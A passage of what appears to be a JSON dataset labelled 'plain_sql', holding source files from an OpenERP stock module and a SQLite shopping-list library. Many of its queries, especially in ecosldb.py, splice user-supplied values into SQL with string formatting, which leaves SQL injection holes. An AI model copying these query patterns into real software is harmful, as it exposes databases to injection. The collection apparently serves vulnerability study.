statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zabertech/openerp-addons-6.1/blob/de89977dbb3cc6265876e071f8a6219eb602b4af",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ecosl-developers/ecosl/blob/8182577b62aa276ddef4ef7606b747e2a809a9e8",
        "file_path": "/ecosldb/ecosldb.py",
        "source": "#!/usr/bin/python3\n# -*- coding: UTF-8 -*-\n\n# \n# This file is part of Ecological Shopping List II (ecosl).\n# \n# Copyright (C) 2011 - 2012  Mika Tapojrvi\n# \n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU Lesser General Public License as published by\n# the Free Software Foundation, version 3 of the License.\n# \n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Lesser General Public License for more details.\n# \n# You should have received a copy of the GNU Lesser General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n\n# http://benspaulding.com/weblog/2008/jun/13/brief-python-sqlite-example/\n# http://docs.python.org/library/sqlite3.html\n# http://docs.python.org/library/argparse.html\n\n\nimport sys\nimport os.path\nimport argparse\nimport sqlite3\nimport codecs\n\n\nclass EcoDB:\n    \"\"\"Database abstraction class for Ecological Shopping List II.\n       All database related functions are implemented as an API.\n    \"\"\"\n\n\n    def __init__(self, db_path):\n        \"\"\"Open ecosl database, if it exists.\"\"\"\n        self.connection = False;\n        self.db_path = db_path\n        if os.path.exists(self.db_path) and os.path.isfile(self.db_path):\n            self.connection = sqlite3.connect(self.db_path)\n            self.cursor = self.connection.cursor()\n            #print('db opened') #  debug\n        else:\n            print('db does not exist') #  debug\n\n    def create_empty_database(self):\n        \"\"\"Create a new, empty database.\"\"\"\n        if self.connection:\n            print('Database already open! Please choose another file name.')\n        else:\n            sql='BEGIN TRANSACTION; \\\n                CREATE TABLE item (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, shoppinglistid INTEGER); \\\n                CREATE UNIQUE INDEX itidname ON item (id, shoppinglistid); \\\n                CREATE TABLE itemlanguage (id INTEGER PRIMARY KEY AUTOINCREMENT, language TEXT); \\\n                CREATE UNIQUE INDEX idlanguage ON itemlanguage (id, language ASC); \\\n                CREATE TABLE itemtranslation (id INTEGER PRIMARY KEY AUTOINCREMENT, itemid INTEGER, itemlanguageid INTEGER, translation TEXT); \\\n                CREATE UNIQUE INDEX iditemlanguageid ON itemtranslation (id, itemlanguageid ASC); \\\n                CREATE TABLE shoppinglist (id INTEGER PRIMARY KEY AUTOINCREMENT, hash TEXT); \\\n                CREATE UNIQUE INDEX idhash ON shoppinglist (id, hash ASC); \\\n                CREATE TABLE shoppinglistitems (id INTEGER PRIMARY KEY AUTOINCREMENT, shoppinglistid INTEGER, itemid INTEGER, amount INTEGER); \\\n                CREATE UNIQUE INDEX idshoppinglistid ON shoppinglistitems (id, shoppinglistid ASC); \\\n                CREATE TABLE store (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT); \\\n                CREATE UNIQUE INDEX stidname ON store (id, name ASC); \\\n                CREATE TABLE price (id INTEGER PRIMARY KEY AUTOINCREMENT, itemid INTEGER, storeid INTEGER, price REAL); \\\n                CREATE UNIQUE INDEX pridstoreid ON price (id, storeid ASC); \\\n                CREATE TABLE shoppingorder (id INTEGER PRIMARY KEY AUTOINCREMENT, storeid INTEGER, itemid INTEGER, shorder INTEGER); \\\n                CREATE UNIQUE INDEX soidstoreid ON shoppingorder (id, storeid ASC); \\\n                COMMIT;'\n\n            self.connection = sqlite3.connect(self.db_path)\n            self.cursor = self.connection.cursor()\n            self.cursor.executescript(sql)\n\n\n\n    def import_database(self, sqlfile):\n        \"\"\"Create new database and import contents of an sql file to it.\"\"\"\n        self.connection = sqlite3.connect(self.db_path)\n        self.cursor = self.connection.cursor()\n        if self.connection:\n            f = codecs.open(sqlfile[0], encoding='utf-8', mode='r')\n            sql = f.read()\n            self.cursor.executescript(sql)\n            print('db created and contents imported from %s' % sqlfile[0])\n\n    def dump_database(self, sqlfile):\n        \"\"\"Dump contents of the database to a file.\"\"\"\n        if self.connection:\n            with codecs.open(sqlfile[0], encoding='utf-8', mode='w') as f:\n                for line in self.connection.iterdump():\n                    f.write('%s\\n' % line)\n            print('db dumped to %s' % sqlfile[0])\n\n    def find_all_items(self, langid):\n        \"\"\"\"Find all items and their translations for the given language.\"\"\"\n        if langid[0] == '0': # all items without the translations\n            return self.cursor.execute('select * from item')\n        else:\n            return self.cursor.execute('select item.id, item.shoppinglistid, item.name, \\\n                itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \\\n                itemtranslation.translation \\\n                from item \\\n                left join itemtranslation \\\n                on itemtranslation.itemlanguageid = \"%s\" and itemtranslation.itemid = item.id' % langid[0])\n\n    def find_item_name(self, nameid):\n        \"\"\"\"Find items and translations by their name for the given language.\"\"\"\n        if nameid[1] == '0':\n            return self.cursor.execute('select * from item \\\n                where item.name = \"%s\"' % nameid[0])\n        else:\n            return self.cursor.execute('select item.id, item.name, item.shoppinglistid, \\\n                itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \\\n                itemtranslation.translation \\\n                from item, itemtranslation \\\n                where item.name = \"%s\" and itemtranslation.itemlanguageid = \"%s\" and itemtranslation.itemid = item.id' % (nameid[0], nameid[1]))\n\n    def find_item_id(self, idid):\n        \"\"\"\"Find items and translations by their id for the given language.\"\"\"\n        return self.cursor.execute('select item.id, item.shoppinglistid, item.name, \\\n            itemtranslation.id, itemtranslation.itemid, itemtranslation.itemlanguageid, \\\n            itemtranslation.translation \\\n            from item, itemtranslation \\\n            where item.id = \"%s\" and itemtranslation.itemlanguageid = \"%s\" and itemtranslation.itemid = item.id' % (idid[0], idid[1]))\n\n    def get_list_items(self, a_list):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Get all items for a single shopping list\"\"\"\n        return self.cursor.execute('select items.itemid, listitems.amount, items.itemname from items, listitems, lists where lists.listhash = \"%s\" and listitems.listid = lists.listid and listitems.itemid = items.itemid' % a_list)\n\n    #\n    # Adding, modifying and removing items to database\n\n    def add_item(self, item):\n        \"\"\"\"Add new item.\"\"\"\n        if self.connection:\n            self.cursor.execute('insert into item (name, shoppinglistid) values (\"%s\", \"%s\")' % (item[0], item[1]))\n            self.connection.commit()\n            #r = self.cursor.execute('select id, name, shoppinglistid from item where name = \"%s\"' % item[0]).fetchall()[0]\n\n    def update_item(self, itemid, itemname):  # NOT UPDATED FOR ECOSL II\n        \"\"\"Update the name of an item\"\"\"\n        self.cursor.execute('update items set itemname = \"%s\" where itemid = \"%s\"' % (itemname, itemid))\n        self.connection.commit()\n\n    def remove_item(self, item):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Remove an item completely\"\"\"\n        r = self.cursor.execute('delete from items where itemname = \"%s\"' % item)\n        self.connection.commit()\n\n    def add_language(self, language):\n        \"\"\"\"Add new language for item translations.\"\"\"\n        if self.connection:\n            self.cursor.execute('insert into itemlanguage (language) values (\"%s\")' % language[0])\n            self.connection.commit()\n\n    def add_translation(self, trid):\n        \"\"\"Add new translation by item id for an item.\"\"\"\n        if self.connection:\n            self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values (\"%s\", \"%s\", \"%s\")' % (trid[0], trid[1], trid[2]))\n            self.connection.commit()\n\n    def add_translationname(self, trname):\n        \"\"\"Add new translation by item name for an item.\"\"\"\n        if self.connection:\n            for item in self.find_item_name([trname[0], '0']):\n                self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values (\"%s\", \"%s\", \"%s\")' % (item[0], trname[1], trname[2]))\n            self.connection.commit()\n\n\n    #\n    # Adding, modifying and removing shopping lists\n\n    def add_shoppinglist(self, slist):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Add a new shoppinglist\"\"\"\n        t = (slist, )\n        self.cursor.execute('insert into lists (listhash) values (?)', t)\n        self.connection.commit()\n        r = self.cursor.execute('select listid, listhash from lists where listhash = \"%s\"' % slist).fetchall()[0]\n        return r\n\n    def update_shoppinglist(self, slistid, slisthash):  # NOT UPDATED FOR ECOSL II\n        self.cursor.execute('update lists set listhash = \"%s\" where listid = \"%s\"' % (slisthash, slistid))\n        self.connection.commit()\n\n    def addtolist(self, listhash, itemind, amount):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Add a given amount of items to shopping list\"\"\"\n        # get list id\n        listid = self.cursor.execute('select listid, listhash from lists where listhash = \"%s\"' % listhash).fetchall()[0]\n        t = (listid[0], itemind, amount)\n        self.cursor.execute('insert into listitems (listid, itemid, amount) values (?, ?, ?)', t)\n        self.connection.commit()\n        r = self.cursor.execute('select listitemsid, listid, itemid, amount from listitems where listid=\"%s\" and itemid = \"%s\"' % (listid[0], itemind)).fetchall()[0]\n        return r\n\n    def removefromlist(self, listhash, itemind):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Remove an item from a shopping list\"\"\"\n        # get list id\n        listid = self.cursor.execute('select listid from lists where listhash = \"%s\"' % listhash).fetchall()[0]\n        print('removing itemind, listid: %s, %s' % (itemind, listid[0]))\n        r = self.cursor.execute('delete from listitems where (itemid = \"%s\" and listid = \"%s\")' % (itemind, listid[0]))\n        self.connection.commit()\n\n    def add_store(self, store):\n        \"\"\"\"Add new store\"\"\"\n        t = (store[0], )\n        self.cursor.execute('insert into store (name) values (?)', t)\n        self.connection.commit()\n\n    def update_store(self, storeid, storename):  # NOT UPDATED FOR ECOSL II\n        self.cursor.execute('update store set storename = \"%s\" where storeid = \"%s\"' % (storename, storeid))\n        self.connection.commit()\n\n    def get_all_stores(self):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Get all stores\"\"\"\n        return self.cursor.execute('select storeid, storename from store')\n\n    def get_all_shoppinglists(self):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Get all shoppinglists\"\"\"\n        return self.cursor.execute('select listid, listhash from lists')\n\n    def add_price(self, itemid, storeid, price):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"Add a price to an item for a store\"\"\"\n        r = self.cursor.execute('select priceid, itemid, storeid, price from itemprices where (itemid = %s and storeid = %s)' % (itemid, storeid)).fetchall()\n        #print r\n\n        # Check if price for this item in this store exists: if it does, update, if not, insert.\n        if r == []:\n            #print 'price not found, inserting...'\n            t = (itemid, storeid, price)\n            self.cursor.execute('insert into itemprices (itemid, storeid, price) values (?, ?, ?)', t)\n            self.connection.commit()\n            #r = self.cursor.execute('select priceid, itemid, storeid, price from itemprices where (itemid = %s and storeid = %s)' % (itemid, storeid)).fetchall()\n            #print 'new values:'\n            #print r\n        else:\n            #print 'old (%s) and new (%s) price differ, updating...' % (fetchedprice, price)\n            self.cursor.execute('update itemprices set price = \"%s\" where (itemid = \"%s\" and storeid = \"%s\")' % (price, itemid, storeid))\n            self.connection.commit()\n        #return r\n\n    def list_items_in_order(self, storeind):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"List items in correct order for one store\"\"\"\n        # Currently only thing that connects an item and a store is shoppingorder\n        # table.\n        r = self.cursor.execute('select shoppingorder.sorder, shoppingorder.storeid, shoppingorder.itemid, store.storeid, store.storename, items.itemid, items.itemname from shoppingorder, store, items where (store.storeid = %s and items.itemid = shoppingorder.itemid and shoppingorder.storeid = store.storeid) order by shoppingorder.sorder' % storeind).fetchall()\n        return r\n\n    def list_items_not_in_store(self, storeind):  # NOT UPDATED FOR ECOSL II\n        \"\"\"\"List items that do not exist in store\"\"\"\n        r = self.cursor.execute('select items.itemid, items.itemname from items where items.itemid not in (select shoppingorder.itemid from shoppingorder, store where store.storeid = \"%s\" and store.storeid = shoppingorder.storeid) order by items.itemname' % storeind).fetchall()\n        return r\n\n\n\n\n#\n# main function\n#\n\nif __name__ == '__main__':\n    \"\"\"\"Main function, to be used for creating the database, developing and testing.\"\"\"\n\n    # Main parser\n    ap = argparse.ArgumentParser(epilog='Note: this library does not work yet!')\n    ap.add_argument('-d', '--database', nargs=1, metavar='<path/file.db>', required=True, help='The path to the database')\n    \n    subparsers = ap.add_subparsers(title='Subcommands')\n\n    # Subparser for creating the database\n    create_parser = subparsers.add_parser('create', help='subcommand to create a new database or dump the contents to a file.');\n    create_parser.add_argument('-e', '--empty', action='store_true', 